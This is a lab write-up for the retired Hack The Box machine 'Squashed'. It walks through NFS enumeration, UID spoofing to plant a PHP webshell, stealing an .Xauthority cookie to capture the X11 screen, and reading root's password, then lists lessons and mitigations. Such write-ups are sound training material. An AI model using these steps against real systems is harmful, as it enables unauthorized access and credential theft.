---
machine: Squashed
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, nfs, uid-spoofing, x11, xauthority, keepass]
---

# Squashed — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Two NFS exports trust the client UID. By spoofing the owner's UID, a webshell is written to `/var/www/html` and access is gained. Then `.Xauthority` is stolen, the X11 screen is captured and root's password is read.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p22,80,111,2049 <IP>
showmount -e <IP>
```

The exports are `/home/ross` and `/var/www/html`. Mount them locally:

```bash
sudo mount -t nfs <IP>:/var/www/html /mnt/web
sudo mount -t nfs <IP>:/home/ross /mnt/ross
```

## Initial access

`/var/www/html` is owned by UID 2017 (user `alex`). Create a local user with that UID/GID and write a webshell:

```bash
sudo useradd -u 2017 -M fakewww
sudo -u fakewww cp shell.php /mnt/web/shell.php
curl 'http://<IP>/shell.php?c=id'
```

The shell runs as `alex`. An SSH key can also be added to `/home/alex/.ssh`.

## Lateral movement

`ross`'s home belongs to UID 1001 and is readable after spoofing it. Copy `.Xauthority` and use it to authenticate to display `:0`.

## Privilege escalation

With the X11 cookie, capture the desktop:

```bash
export XAUTHORITY=/tmp/.Xauthority
xwd -display :0 -root -screen -silent > /tmp/screen.xwd
convert /tmp/screen.xwd /tmp/screen.png
```

The image shows root's password written on the desktop. Use it with `su`:

```bash
su root
```

## Evidence

- `showmount` and NFS mounts.
- Spoofed UID and webshell.
- `.Xauthority` and X11 capture.
- Redacted password and root shell.

## Lessons learned

- NFS authenticates by UID/GID, not by machine.
- `no_root_squash` and broad exports break isolation.
- `.Xauthority` allows display control.
- On-screen secrets are evidence.

## Mitigation and detection

- Export NFS only to trusted hosts and networks.
- Use `root_squash` and consistent UID/GID.
- Restrict X11 and `-nolisten tcp`.
- Never display credentials on the desktop.

## References

- <https://www.hackthebox.com/machines/squashed>
- <https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting>
- <https://www.x.org/>
